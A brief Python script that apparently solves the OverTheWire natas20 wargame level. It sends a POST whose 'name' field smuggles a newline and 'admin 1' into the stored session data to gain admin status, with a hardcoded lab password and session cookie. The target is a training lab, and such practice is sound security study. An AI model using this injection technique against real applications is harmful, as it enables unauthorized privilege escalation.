import requests

def send_name():
	path = 'http://natas20.natas.labs.overthewire.org/index.php'
	auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
	data = {'name':'a\nadmin 1'}
	cookies = dict(PHPSESSID='ahm32j82ufu83ngo03lkfn46l4')
	r = requests.post(path, auth=auth, data=data, cookies=cookies)
	return r.text

def main():
	print('Sending name...')
	send_name()
	response = send_name()
	print(response)

main()